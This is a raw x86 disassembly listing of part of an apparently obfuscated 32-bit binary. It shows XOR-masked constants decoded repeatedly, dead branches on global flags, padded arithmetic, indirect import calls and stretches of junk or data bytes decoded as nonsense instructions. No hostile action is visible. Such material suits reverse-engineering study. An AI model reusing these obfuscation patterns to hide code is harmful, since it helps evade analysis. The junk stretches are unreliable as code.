  420df9:	and    DWORD PTR [esi+0x6342031],0xb
  420e00:	mov    dl,0x13
  420e02:	enter  0xa769,0xc
  420e06:	fsub   QWORD PTR [ebp+0x2608dc7c]
  420e0c:	jb     0x420e3c
  420e0e:	push   0xa98984d4
  420e13:	hlt    
  420e14:	dec    ecx
  420e15:	das    
  420e16:	dec    ecx
  420e17:	and    ecx,edx
  420e19:	in     eax,0x71
  420e1b:	rcl    ecx,0x3f
  420e1e:	jns    0x420daf
  420e20:	inc    esp
  420e21:	iret   
  420e22:	add    esi,DWORD PTR [edi+0x86c530b]
  420e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e29:	test   edi,esi
  420e2b:	sbb    al,0x83
  420e2d:	fsub   DWORD PTR [ebp+edx*1+0x2c]
  420e31:	mov    dl,0x4
  420e33:	test   eax,0x6308d56d
  420e38:	mov    ebx,0xb89fd153
  420e3d:	cmp    eax,0xeeb8bf4d
  420e42:	mov    cl,0x42
  420e44:	cld    
  420e45:	lock retf 0xa19
  420e49:	cmp    eax,0x5db98de7
  420e4e:	in     eax,dx
  420e4f:	xor    al,0x91
  420e51:	mov    ebp,0xa8c46e29
  420e56:	add    esi,DWORD PTR [ecx+eax*4-0x16]
  420e5a:	lods   eax,DWORD PTR ds:[esi]
  420e5b:	sub    DWORD PTR [eax],eax
  420e5d:	add    BYTE PTR [ebx+0x42816b35],cl
  420e63:	add    BYTE PTR [ecx],bl
  420e65:	xor    eax,0x42835f
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x42837b,0x0
  420e74:	mov    DWORD PTR ds:0x428233,ebx
  420e7a:	mov    DWORD PTR ds:0x42816b,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x42815f
  420e8e:	mov    DWORD PTR ds:0x428243,0x776f
  420e98:	cmp    DWORD PTR ds:0x42837b,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428217
  420eaa:	push   0x42807f
  420eaf:	call   DWORD PTR ds:0x428e38
  420eb5:	add    ecx,DWORD PTR ds:0x428377
  420ebb:	xor    esi,DWORD PTR ds:0x42820f
  420ec1:	adc    DWORD PTR ds:0x428267,edx
  420ec7:	xor    DWORD PTR ds:0x4282ef,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42821b
  420ed3:	or     esi,DWORD PTR ds:0x428177
  420ed9:	mov    DWORD PTR ds:0x42821b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x42824f
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428137
  420eef:	sbb    eax,DWORD PTR ds:0x4282eb
  420ef5:	mov    ds:0x428137,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x4281e7
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42833f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x4282ef,0x0
  420f23:	mov    DWORD PTR ds:0x428283,0x1362
  420f2d:	mov    DWORD PTR ds:0x428233,edx
  420f33:	mov    DWORD PTR ds:0x42826f,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x428353,0xeb5
  420f48:	cmp    DWORD PTR ds:0x4282ef,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428eb0
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x4281bf
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x4281cb
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x428247,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42823f
  420f87:	sbb    edx,DWORD PTR ds:0x428387
  420f8d:	mov    DWORD PTR ds:0x42823f,edx
  420f93:	add    DWORD PTR ds:0x42817b,ecx
  420f99:	sub    DWORD PTR ds:0x42836b,0x4282db
  420fa3:	cmp    DWORD PTR ds:0x428267,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x42834b
  420fb0:	movzx  edx,BYTE PTR ds:0x428153
  420fb7:	mov    DWORD PTR ds:0x4282d7,0x5580
  420fc1:	mov    DWORD PTR ds:0x428383,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x428387,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428267,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d54
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x4282e7
  421000:	sbb    DWORD PTR ds:0x428263,edx
  421006:	movzx  edx,WORD PTR ds:0x42813b
  42100d:	or     edx,DWORD PTR ds:0x428363
  421013:	mov    DWORD PTR ds:0x42813b,edx
  421019:	dec    DWORD PTR ds:0x428353
  42101f:	sub    DWORD PTR ds:0x42825f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42814b,0x0
  421048:	mov    DWORD PTR ds:0x428357,0x62d9
  421052:	mov    DWORD PTR ds:0x428137,0x300d
  42105c:	mov    DWORD PTR ds:0x42813b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282df
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42834f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42814b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d74
  4210a1:	sbb    ecx,DWORD PTR ds:0x428263
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x428287,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428143
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x422214
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x421357
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xc4bc:0x65828d2a
  42115b:	pusha  
  42115c:	cdq    
  42115d:	mov    esp,0x18160fc1
  421162:	ds push ss
  421164:	sbb    BYTE PTR [eax],bl
  421166:	adc    BYTE PTR [eax+0xe],al
  421169:	(bad)  
  42116b:	jns    0x42118e
  42116d:	pop    ebp
  42116e:	pop    esi
  42116f:	mov    ecx,0x347d6411
  421174:	push   ebx
  421175:	xor    BYTE PTR [esp+esi*1+0x35],bh
  421179:	mov    ds:0x45dc56eb,al
  42117e:	inc    edx
  42117f:	jne    0x4211d5
  421181:	(bad)  
  421182:	jbe    0x4211e4
  421184:	cld    
  421185:	pop    ebp
  421186:	jns    0x42119a
  421188:	pop    ds
  421189:	xchg   ebp,eax
  42118a:	jmp    0x4211e3
  42118c:	sbb    al,0x14
  42118e:	lahf   
  42118f:	(bad)  
  421190:	int3   
  421191:	ss mov ebp,0x1e609d5e
  421197:	iret   
  421198:	in     al,0x2e
  42119a:	mov    esi,?
  42119c:	pusha  
  42119d:	dec    esi
  42119e:	imul   eax,DWORD PTR [edx-0x1bdc863a],0x941cd20f
  4211a8:	mov    dl,0x30
  4211aa:	xchg   esp,eax
  4211ab:	fistp  DWORD PTR [esi-0x3be1903e]
  4211b1:	fwait
  4211b2:	dec    ecx
  4211b3:	cmp    cl,BYTE PTR [edx+0x201911e0]
  4211b9:	addr16 pushf 
  4211bb:	mov    dl,0x5b
  4211bd:	mov    eax,ds:0xea0fb9c6
  4211c2:	lea    esp,ds:0xda8d857c
  4211c8:	hlt    
  4211c9:	mov    ebp,0xcaec1ce0
  4211ce:	push   esp
  4211cf:	jg     0x4211f0
  4211d1:	js     0x4211fa
  4211d3:	sbb    ch,BYTE PTR [ebp+0x1c]
  4211d6:	dec    esp
  4211d7:	xchg   edi,eax
  4211d8:	mov    esp,0x3bdd8679
  4211dd:	inc    esi
  4211de:	adc    eax,0x3fcb78ad
  4211e3:	pop    edi
  4211e4:	jecxz  0x4211e4
  4211e6:	fsubr  QWORD PTR ds:0x1787fdbc
  4211ec:	sbb    esi,DWORD PTR [edi-0x2d4b1375]
  4211f2:	mov    BYTE PTR [esi],bh
  4211f4:	push   eax
  4211f5:	clc    
  4211f6:	lods   eax,DWORD PTR ds:[esi]
  4211f7:	enter  0x133b,0xa9
  4211fb:	mov    al,0x7f
  4211fd:	loop   0x42120a
  4211ff:	iret   
  421200:	test   DWORD PTR [ebx],edx
  421202:	mov    ch,0x25
  421204:	aaa    
  421205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421206:	pop    ds
  421207:	pop    edx
  421208:	push   esp
  421209:	imul   edi,DWORD PTR [ecx-0x7f],0x16
  42120d:	mov    edi,0x4dbce52a
  421212:	jg     0x4211cc
  421214:	add    dl,al
  421216:	icebp  
  421217:	jo     0x4211cc
  421219:	xchg   edi,eax
  42121a:	push   esp
  42121b:	cli    
  42121c:	test   al,0x80
  42121e:	hlt    
  42121f:	adc    DWORD PTR [ebx-0x619f3046],ebp
  421225:	mov    ebp,fs
  421227:	scas   al,BYTE PTR es:[edi]
  421228:	leave  
  421229:	or     dh,dl
  42122b:	xchg   ebp,eax
  42122c:	(bad)  
  42122d:	mov    ch,0x3c
  42122f:	mov    ebx,0x438e2ad0
  421234:	leave  
  421235:	sar    DWORD PTR [edi],1
  421237:	and    dh,ch
  421239:	imul   eax,DWORD PTR [edx+0x1],0x9dbe3578
  421240:	call   esi
  421242:	into   
  421243:	int    0xf6
  421245:	bound  edx,QWORD PTR [edx+0x14]
  421248:	xor    DWORD PTR [ecx],edi
  42124a:	idiv   DWORD PTR [edx-0x55a4f0dd]
  421250:	or     esp,DWORD PTR [ebx]
  421252:	pusha  
  421253:	or     al,0x52
  421255:	out    0xf4,al
  421257:	xchg   esi,eax
  421258:	adc    BYTE PTR [esp+eax*2-0x3d],bh
  42125c:	inc    eax
  42125d:	mov    ah,0x5f
  42125f:	xor    eax,0x83fa6c1e
  421264:	dec    edx
  421265:	sbb    eax,0xce97c294
  42126a:	mov    edx,0xee8f220d
  42126f:	aas    
  421270:	out    0xbd,al
  421272:	fld    TBYTE PTR [edx+0x3d2a41fe]
  421278:	add    dh,BYTE PTR [eax+eax*4]
  42127b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42127c:	or     BYTE PTR [ebx-0x37876ec6],cl
  421282:	call   0xb2ca9aad
  421287:	inc    edi
  421288:	loope  0x4212d2
  42128a:	and    eax,0x883e51e1
  42128f:	sub    cl,BYTE PTR [esi]
  421291:	inc    esp
  421292:	pop    ecx
  421293:	int3   
  421294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421295:	scas   eax,DWORD PTR es:[edi]
  421296:	add    eax,0xf378f76e
  42129b:	in     eax,0x53
  42129d:	xchg   esi,eax
  42129e:	in     al,dx
  42129f:	xor    DWORD PTR [edi+0x1],0x6a79c358
  4212a6:	fidivr DWORD PTR [ecx-0x2f]
  4212a9:	push   eax
  4212aa:	mov    WORD PTR [ecx],gs
  4212ac:	aad    0x31
  4212ae:	test   eax,0x475408b7
  4212b3:	xchg   edi,eax
  4212b4:	popa   
  4212b5:	push   cs
  4212b6:	std    
  4212b7:	fld    TBYTE PTR [edi]
  4212b9:	mov    ds:0xd5dde843,eax
  4212be:	mov    ch,0x19
  4212c0:	mov    dh,0x74
  4212c2:	hlt    
  4212c3:	stos   BYTE PTR es:[edi],al
  4212c4:	pop    ebx
  4212c5:	jbe    0x4212b7
  4212c7:	mov    ah,BYTE PTR [esi+0x562c09a0]
  4212cd:	repz adc eax,0xe4d72851
  4212d3:	hlt    
  4212d4:	enter  0x82ef,0x25
  4212d8:	(bad)  
  4212d9:	pushf  
  4212da:	iret   
  4212db:	push   ds
  4212dc:	daa    
  4212dd:	out    dx,eax
  4212de:	call   0x86303a11
  4212e3:	call   FWORD PTR [ebx+0x34]
  4212e6:	push   cs
  4212e7:	add    ecx,edx
  4212e9:	lea    ecx,[ebx-0x77]
  4212ec:	(bad)  ds:0xfd35dcdb
  4212f2:	fwait
  4212f3:	xchg   ebx,edi
  4212f5:	jnp    0x42128b
  4212f7:	xchg   BYTE PTR [edi+0x2273631],ah
  4212fd:	call   0x4166:0xb32cc73c
  421304:	jmp    0xedea25f9
  421309:	ins    DWORD PTR es:[edi],dx
  42130a:	inc    ecx
  42130b:	loopne 0x421332
  42130d:	inc    ebp
  42130e:	mov    eax,0x9c839f73
  421313:	inc    edx
  421314:	mov    ebx,0xe5bcffab
  421319:	mov    dl,0x70
  42131b:	push   ebx
  42131c:	push   ebp
  42131d:	imul   edi,DWORD PTR [eax+0x14ae29aa],0xa89e5915
  421327:	add    eax,0x755eb4ad
  42132c:	push   ebp
  42132d:	sub    dh,BYTE PTR [ecx]
  42132f:	je     0x421323
  421331:	pop    edi
  421332:	inc    ebp
  421333:	xchg   ebx,eax
  421334:	dec    edi
  421336:	mov    ch,0x9d
  421338:	cmp    esp,ebx
  42133a:	fs push ebx
  42133c:	in     eax,0x75
  42133e:	adc    al,0xed
  421340:	shr    BYTE PTR [edx],1
  421342:	mov    BYTE PTR [esi],dl
  421344:	jbe    0x421371
  421346:	push   edi
  421347:	sub    eax,0xca2cfbce
  42134c:	imul   ecx,DWORD PTR [esi+0x57],0xb885abb8
  421353:	js     0x4212eb
  421355:	in     al,0x71
  421357:	mov    eax,DWORD PTR [ebp-0x15c]
  42135d:	mov    edx,DWORD PTR [ebp-0x158]
  421363:	xor    eax,0xca79a575
  421368:	xor    edx,0x9c1b89e8
  42136e:	mov    cl,0x2
  421370:	call   0x40a9b5
  421375:	mov    ecx,edx
  421377:	mov    edx,DWORD PTR [ebp-0x15c]
  42137d:	mov    DWORD PTR [ebp-0x218],esi
  421383:	mov    esi,DWORD PTR [ebp-0x158]
  421389:	xor    edx,0xca79a575
  42138f:	xor    esi,0x9c1b89e8
  421395:	mov    DWORD PTR [ebp-0x21c],eax
  42139b:	mov    eax,edx
  42139d:	mov    edx,esi
  42139f:	mov    DWORD PTR [ebp-0x220],ecx
  4213a5:	mov    cl,0x3e
  4213a7:	call   0x422214
  4213ac:	mov    esi,DWORD PTR [ebp-0x21c]
  4213b2:	or     esi,eax
  4213b4:	mov    eax,DWORD PTR [ebp-0x220]
  4213ba:	or     eax,edx
  4213bc:	push   eax
  4213bd:	push   esi
  4213be:	push   ebx
  4213bf:	push   edi
  4213c0:	call   0x416c20
  4213c5:	mov    esi,DWORD PTR [ebp-0x218]
  4213cb:	cmp    esi,eax
  4213cd:	jne    0x421483
  4213d3:	mov    eax,DWORD PTR [ebp-0x154]
  4213d9:	mov    edx,DWORD PTR [ebp-0x150]
  4213df:	xor    eax,0xca79a575
  4213e4:	xor    edx,0x9c1b89e8
  4213ea:	mov    cl,0x2
  4213ec:	call   0x40a9b5
  4213f1:	mov    esi,eax
  4213f3:	mov    edi,edx
  4213f5:	mov    eax,DWORD PTR [ebp-0x154]
  4213fb:	mov    edx,DWORD PTR [ebp-0x150]
  421401:	xor    eax,0xca79a575
  421406:	xor    edx,0x9c1b89e8
  42140c:	mov    cl,0x3e
  42140e:	call   0x422214
  421413:	or     esi,eax
  421415:	or     edi,edx
  421417:	mov    eax,DWORD PTR [ebp-0x15c]
  42141d:	mov    edx,DWORD PTR [ebp-0x158]
  421423:	xor    eax,0xca79a575
  421428:	xor    edx,0x9c1b89e8
  42142e:	mov    cl,0x2
  421430:	call   0x40a9b5
  421435:	mov    ebx,eax
  421437:	mov    eax,edx
  421439:	mov    ecx,DWORD PTR [ebp-0x15c]
  42143f:	mov    edx,DWORD PTR [ebp-0x158]
  421445:	xor    ecx,0xca79a575
  42144b:	xor    edx,0x9c1b89e8
  421451:	mov    DWORD PTR [ebp-0x224],eax
  421457:	mov    eax,ecx
  421459:	mov    cl,0x3e
  42145b:	call   0x422214
  421460:	or     ebx,eax
  421462:	mov    eax,DWORD PTR [ebp-0x224]
  421468:	or     eax,edx
  42146a:	push   eax
  42146b:	push   ebx
  42146c:	push   edi
  42146d:	push   esi
  42146e:	call   0x416c20
  421473:	mov    DWORD PTR [ebp-0x178],eax
  421479:	jmp    0x421743
  42147e:	jmp    0x4216f9
  421483:	lea    eax,[ebp-0x168]
  421489:	mov    DWORD PTR [ebp-0x164],eax
  42148f:	mov    eax,DWORD PTR [ebp-0x164]
  421495:	mov    DWORD PTR [eax],0xa4069aae
  42149b:	mov    eax,DWORD PTR [ebp-0x168]
  4214a1:	xor    eax,0xa4069aae
  4214a6:	shr    eax,0x2
  4214a9:	mov    ecx,DWORD PTR [ebp-0x168]
  4214af:	xor    ecx,0xa4069aae
  4214b5:	shl    ecx,0x1e
  4214b8:	or     eax,ecx
  4214ba:	mov    ecx,DWORD PTR [ebp-0x174]
  4214c0:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214c4:	mov    DWORD PTR [ebp-0x160],eax
  4214ca:	mov    esi,DWORD PTR [ebp-0x160]
  4214d0:	mov    eax,DWORD PTR [ebp-0x154]
  4214d6:	mov    edx,DWORD PTR [ebp-0x150]
  4214dc:	xor    eax,0xca79a575
  4214e1:	xor    edx,0x9c1b89e8
  4214e7:	mov    cl,0x2
  4214e9:	call   0x40a9b5
  4214ee:	mov    edi,eax
  4214f0:	mov    ebx,edx
  4214f2:	mov    eax,DWORD PTR [ebp-0x154]
  4214f8:	mov    edx,DWORD PTR [ebp-0x150]
  4214fe:	xor    eax,0xca79a575
  421503:	xor    edx,0x9c1b89e8
  421509:	mov    cl,0x3e
  42150b:	call   0x422214
  421510:	or     edi,eax
  421512:	or     ebx,edx
  421514:	mov    eax,DWORD PTR [ebp-0x15c]
  42151a:	mov    edx,DWORD PTR [ebp-0x158]
  421520:	xor    eax,0xca79a575
  421525:	xor    edx,0x9c1b89e8
  42152b:	mov    cl,0x2
  42152d:	call   0x40a9b5
  421532:	mov    ecx,edx
  421534:	mov    edx,DWORD PTR [ebp-0x15c]
  42153a:	mov    DWORD PTR [ebp-0x228],esi
  421540:	mov    esi,DWORD PTR [ebp-0x158]
  421546:	xor    edx,0xca79a575
  42154c:	xor    esi,0x9c1b89e8
  421552:	mov    DWORD PTR [ebp-0x22c],eax
  421558:	mov    eax,edx
  42155a:	mov    edx,esi
  42155c:	mov    DWORD PTR [ebp-0x230],ecx
  421562:	mov    cl,0x3e
  421564:	call   0x422214
  421569:	mov    esi,DWORD PTR [ebp-0x22c]
  42156f:	or     esi,eax
  421571:	mov    eax,DWORD PTR [ebp-0x230]
  421577:	or     eax,edx
  421579:	push   eax
  42157a:	push   esi
  42157b:	push   ebx
  42157c:	push   edi
  42157d:	call   0x416c20
  421582:	mov    esi,DWORD PTR [ebp-0x228]
  421588:	cmp    esi,eax
  42158a:	je     0x4215ff
  421590:	mov    eax,DWORD PTR [ebp-0x154]
  421596:	mov    edx,DWORD PTR [ebp-0x150]
  42159c:	xor    eax,0xca79a575
  4215a1:	xor    edx,0x9c1b89e8
  4215a7:	mov    cl,0x2
  4215a9:	call   0x40a9b5
  4215ae:	mov    esi,eax
  4215b0:	mov    edi,edx
  4215b2:	mov    eax,DWORD PTR [ebp-0x154]
  4215b8:	mov    edx,DWORD PTR [ebp-0x150]
  4215be:	xor    eax,0xca79a575
  4215c3:	xor    edx,0x9c1b89e8
  4215c9:	mov    cl,0x3e
  4215cb:	call   0x422214
  4215d0:	or     esi,eax
  4215d2:	or     edi,edx
  4215d4:	mov    eax,DWORD PTR [ebp-0x160]
  4215da:	imul   esi,eax
  4215dd:	add    esi,DWORD PTR [ebp-0x170]
  4215e3:	mov    DWORD PTR [ebp-0x16c],esi
  4215e9:	mov    eax,DWORD PTR [ebp-0x16c]
  4215ef:	mov    DWORD PTR [ebp-0x178],eax
  4215f5:	jmp    0x421743
  4215fa:	jmp    0x4216aa
  4215ff:	mov    eax,DWORD PTR [ebp-0x154]
  421605:	mov    edx,DWORD PTR [ebp-0x150]
  42160b:	xor    eax,0xca79a575
  421610:	xor    edx,0x9c1b89e8
  421616:	mov    cl,0x2
  421618:	call   0x40a9b5
  42161d:	mov    esi,eax
  42161f:	mov    edi,edx
  421621:	mov    eax,DWORD PTR [ebp-0x154]
  421627:	mov    edx,DWORD PTR [ebp-0x150]
  42162d:	xor    eax,0xca79a575
  421632:	xor    edx,0x9c1b89e8
  421638:	mov    cl,0x3e
  42163a:	call   0x422214
  42163f:	or     esi,eax
  421641:	or     edi,edx
  421643:	mov    eax,DWORD PTR [ebp-0x15c]
  421649:	mov    edx,DWORD PTR [ebp-0x158]
  42164f:	xor    eax,0xca79a575
  421654:	xor    edx,0x9c1b89e8
  42165a:	mov    cl,0x2
  42165c:	call   0x40a9b5
  421661:	mov    ebx,eax
  421663:	mov    eax,edx
  421665:	mov    ecx,DWORD PTR [ebp-0x15c]
  42166b:	mov    edx,DWORD PTR [ebp-0x158]
  421671:	xor    ecx,0xca79a575
  421677:	xor    edx,0x9c1b89e8
  42167d:	mov    DWORD PTR [ebp-0x234],eax
  421683:	mov    eax,ecx
  421685:	mov    cl,0x3e
  421687:	call   0x422214
  42168c:	or     ebx,eax
  42168e:	mov    eax,DWORD PTR [ebp-0x234]
  421694:	or     eax,edx
  421696:	push   eax
  421697:	push   ebx
  421698:	push   edi
  421699:	push   esi
  42169a:	call   0x416c20
  42169f:	mov    DWORD PTR [ebp-0x178],eax
  4216a5:	jmp    0x421743
  4216aa:	mov    eax,DWORD PTR [ebp-0x15c]
  4216b0:	mov    edx,DWORD PTR [ebp-0x158]
  4216b6:	xor    eax,0xca79a575
  4216bb:	xor    edx,0x9c1b89e8
  4216c1:	mov    cl,0x2
  4216c3:	call   0x40a9b5
  4216c8:	mov    esi,eax
  4216ca:	mov    edi,edx
  4216cc:	mov    eax,DWORD PTR [ebp-0x15c]
  4216d2:	mov    edx,DWORD PTR [ebp-0x158]
  4216d8:	xor    eax,0xca79a575
  4216dd:	xor    edx,0x9c1b89e8
  4216e3:	mov    cl,0x3e
  4216e5:	call   0x422214
  4216ea:	or     esi,eax
  4216ec:	or     edi,edx
  4216ee:	mov    DWORD PTR [ebp-0x178],esi
  4216f4:	jmp    0x421743
  4216f9:	mov    eax,DWORD PTR [ebp-0x15c]
  4216ff:	mov    edx,DWORD PTR [ebp-0x158]
  421705:	xor    eax,0xca79a575
  42170a:	xor    edx,0x9c1b89e8
  421710:	mov    cl,0x2
  421712:	call   0x40a9b5
  421717:	mov    esi,eax
  421719:	mov    edi,edx
  42171b:	mov    eax,DWORD PTR [ebp-0x15c]
  421721:	mov    edx,DWORD PTR [ebp-0x158]
  421727:	xor    eax,0xca79a575
  42172c:	xor    edx,0x9c1b89e8
  421732:	mov    cl,0x3e
  421734:	call   0x422214
  421739:	or     esi,eax
  42173b:	or     edi,edx
  42173d:	mov    DWORD PTR [ebp-0x178],esi
  421743:	mov    ecx,DWORD PTR [ebp-0xd8]
  421749:	mov    eax,0x459a
  42174e:	xor    edx,edx
  421750:	div    ecx
  421752:	mov    ecx,DWORD PTR [ebp-0xdc]
  421758:	and    eax,ecx
  42175a:	add    eax,DWORD PTR [ebp-0x44]
  42175d:	mov    ecx,DWORD PTR [ebp-0xe0]
  421763:	lea    eax,[eax+ecx*1+0x272f]
  42176a:	xor    eax,0x1080c
  42176f:	add    eax,DWORD PTR [ebp-0x178]
  421775:	mov    DWORD PTR [ebp-0xe8],eax
  42177b:	mov    DWORD PTR [ebp-0xc],0x5950
  421782:	mov    DWORD PTR [ebp-0xf8],0x4964
  42178c:	mov    DWORD PTR [ebp-0x130],0x3
  421796:	mov    DWORD PTR [ebp-0x20],0x2df9
  42179d:	mov    DWORD PTR [ebp-0x8],0x4524
  4217a4:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217ae:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217b8:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217c2:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217cc:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217d6:	mov    eax,DWORD PTR [ebp-0xf8]
  4217dc:	mov    ecx,DWORD PTR [ebp-0x130]
  4217e2:	xor    edx,edx
  4217e4:	div    ecx
  4217e6:	add    eax,0x454e
  4217eb:	mov    ecx,DWORD PTR [ebp-0xc]
  4217ee:	and    eax,ecx
  4217f0:	xor    eax,0x5940
  4217f5:	add    eax,DWORD PTR [ebp+0x8]
  4217f8:	mov    ecx,DWORD PTR [ebp-0x110]
  4217fe:	mov    edx,DWORD PTR [ebp-0xa4]
  421804:	sub    ecx,edx
  421806:	mov    edx,DWORD PTR [ebp-0xd4]
  42180c:	or     ecx,edx
  42180e:	mov    edx,DWORD PTR [ebp-0x8]
  421811:	and    ecx,edx
  421813:	mov    edx,DWORD PTR [ebp-0x20]
  421816:	xor    ecx,edx
  421818:	mov    edx,DWORD PTR [ebp-0x10c]
  42181e:	mov    esi,0x180f
  421823:	sub    esi,edx
  421825:	mov    edx,DWORD PTR [ebp-0xa0]
  42182b:	imul   esi,edx
  42182e:	xor    esi,0x402b
  421834:	xor    esi,0xfed78c17
  42183a:	mov    edx,DWORD PTR [ebp-0xe8]
  421840:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  421847:	add    ecx,eax
  421849:	add    esi,ecx
  42184b:	mov    DWORD PTR [ebp-0x38],esi
  42184e:	mov    DWORD PTR [ebp-0x4],0x59a8
  421855:	mov    DWORD PTR [ebp-0x30],0x7021
  42185c:	mov    DWORD PTR [ebp-0xf4],0x6210
  421866:	mov    DWORD PTR [ebp-0x58],0x73d5
  42186d:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421877:	mov    DWORD PTR [ebp-0x3c],0x3144
  42187e:	mov    eax,DWORD PTR [ebp-0x30]
  421881:	xor    eax,0x75cb
  421886:	mov    ecx,DWORD PTR [ebp-0x4]
  421889:	imul   eax,ecx
  42188c:	mov    ecx,DWORD PTR [ebp+0x8]
  42188f:	lea    ecx,[ecx+eax*1-0x2123b90]
  421896:	mov    eax,DWORD PTR [ebp-0xf4]
  42189c:	and    eax,0x6b34
  4218a1:	and    eax,0x658d
  4218a6:	xor    edx,edx
  4218a8:	push   0x6
  4218aa:	pop    esi
  4218ab:	div    esi
  4218ad:	imul   eax,eax,0x3fb9
  4218b3:	mov    edx,DWORD PTR [ebp-0x3c]
  4218b6:	and    edx,0x58c7
  4218bc:	mov    esi,DWORD PTR [ebp-0x124]
  4218c2:	or     edx,esi
  4218c4:	add    edx,0x7a25
  4218ca:	imul   edx,edx,0x28d2
  4218d0:	mov    esi,DWORD PTR [ebp-0x58]
  4218d3:	xor    edx,esi
  4218d5:	xor    edx,0x1856f731
  4218db:	mov    esi,DWORD PTR [ebp-0xe8]
  4218e1:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  4218e8:	add    eax,ecx
  4218ea:	add    edx,eax
  4218ec:	mov    DWORD PTR [ebp-0xac],edx
  4218f2:	mov    DWORD PTR [ebp-0x54],0x1
  4218f9:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421900:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421907:	mov    DWORD PTR [ebp-0xf0],0x5a06
  421911:	mov    DWORD PTR [ebp-0x108],0x2eeb
  42191b:	mov    DWORD PTR [ebp-0x104],0x2108
  421925:	mov    eax,DWORD PTR [ebp-0x1c]
  421928:	xor    edx,edx
  42192a:	push   0x3
  42192c:	pop    ecx
  42192d:	div    ecx
  42192f:	mov    ecx,DWORD PTR [ebp-0x40]
  421932:	or     eax,ecx
  421934:	mov    ecx,DWORD PTR [ebp-0x54]
  421937:	xor    edx,edx
  421939:	div    ecx
  42193b:	imul   eax,eax,0x7d53
